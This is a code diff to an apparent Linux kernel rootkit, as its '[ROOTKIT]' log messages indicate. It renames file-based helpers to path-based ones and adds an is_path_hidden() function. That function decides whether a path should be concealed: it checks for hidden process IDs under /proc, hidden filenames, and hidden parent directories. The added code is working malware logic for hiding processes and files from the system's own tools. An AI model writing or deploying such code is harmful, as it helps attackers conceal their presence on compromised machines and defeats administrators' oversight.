@@ -14,13 +14,13 @@
 #include <linux/string.h>
 #include <linux/types.h>
 
-bool is_process_file(const file_t *const p_file, const char **const ps_name, pid_t *p_pid)
+bool is_process_path(const path_t *const p_path, const char **const ps_name, pid_t *p_pid)
 {
     int i_res                = 0;    // Result of `kstrtoint()` (0 on success)
     const dentry_t *p_parent = NULL; // Parent dentry structure
     pid_t i32_pid            = -1;   // PID of the process found in the path, if any
 
-    IF_U (!is_proc_descendant(p_file)) {
+    IF_U (!is_path_proc_descendant(p_path)) {
         if (ps_name != NULL) {
             *ps_name = NULL;
         }
@@ -30,7 +30,7 @@ bool is_process_file(const file_t *const p_file, const char **const ps_name, pid
         return false;
     }
 
-    p_parent = p_file->f_path.dentry;
+    p_parent = p_path->dentry;
 
     // Go up the directory tree until we reach a direct child of the root
     while (!IS_ROOT(p_parent->d_parent)) {
@@ -53,7 +53,45 @@ bool is_process_file(const file_t *const p_file, const char **const ps_name, pid
     return i_res == 0;
 }
 
-const file_t *fd_get_file(const int d_fd)
+bool is_path_hidden(const path_t *const p_path)
+{
+    const dentry_t *p_parent = NULL; // dentry structure for parent directories
+    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any
+
+    IF_U (p_path == NULL) {
+        return false;
+    }
+
+    IF_U (is_process_path(p_path, NULL, &i32_found_pid)) {
+        pr_info("[ROOTKIT] * This is a process file/dir (PID: %d)\n", i32_found_pid);
+
+        // If the path is a process file/dir, check if the process is hidden
+        return is_pid_hidden(i32_found_pid);
+    }
+    else {
+        pr_info("[ROOTKIT] * This is not a process file/dir\n");
+    }
+
+    IF_U (is_filename_or_pid_hidden(p_path->dentry->d_name.name,
+                                    is_path_parent_proc_root(p_path))) {
+        return true;
+    }
+
+    // If the path is not a process file/dir, check if one of its parents has a hidden name
+    p_parent = p_path->dentry->d_parent;
+    while (!IS_ROOT(p_parent)) {
+        if (is_filename_hidden(p_parent->d_name.name)) {
+            pr_info("[ROOTKIT] * Parent directory is hidden: %s\n", p_parent->d_name.name);
+            return true;
+        }
+
+        p_parent = p_parent->d_parent;
+    }
+
+    return false;
+}
+
+const file_t *fd_get_file(const int i32_fd)
 {
     const file_t *p_file = NULL;           // File structure
     files_t *p_files     = current->files; // Reference to the current task files
@@ -63,13 +101,13 @@ const file_t *fd_get_file(const int d_fd)
         return ERR_PTR(-ENOENT);
     }
 
-    IF_U (d_fd < 0) {
+    IF_U (i32_fd < 0) {
         // If the file descriptor is invalid, return an error
         return ERR_PTR(-EBADF);
     }
 
     spin_lock(&p_files->file_lock); // Lock the files structure while we use it
-    p_file = lookup_fd_rcu(d_fd);
+    p_file = lookup_fd_rcu(i32_fd);
     spin_unlock(&p_files->file_lock);
 
     IF_U (p_file == NULL) {
@@ -79,20 +117,19 @@ const file_t *fd_get_file(const int d_fd)
     return p_file;
 }
 
-const char *file_get_pathname(const file_t *const p_file)
+const char *path_get_pathname(const path_t *const p_path)
 {
     const char *s_pathname     = NULL; // Pathname of the file
     const char *s_pathname_ret = NULL; // Pathname of the file (return value)
     char *p_tmp                = NULL; // Temporary buffer for `d_path()`
-    const path_t *p_path       = NULL; // Path structure
 
-    IF_U (p_file == NULL) {
+    IF_U (p_path == NULL) {
         return ERR_PTR(-EINVAL);
     }
 
-    p_path = &p_file->f_path;
     path_get(p_path); // Increment the path reference count while we use it
 
+    // Allocate a page of memory since PATH_MAX == PAGE_SIZE
     p_tmp = (char *)__get_free_page(GFP_KERNEL);
 
     IF_U (p_tmp == NULL) {
@@ -112,16 +149,4 @@ const char *file_get_pathname(const file_t *const p_file)
 
     free_page((unsigned long)p_tmp);
     return s_pathname_ret;
-}
-
-const char *fd_get_pathname(const int d_fd)
-{
-    const file_t *p_file = NULL; // File structure
-
-    p_file = fd_get_file(d_fd);
-    IF_U (IS_ERR(p_file)) {
-        return (char *)p_file;
-    }
-
-    return file_get_pathname(p_file);
 }
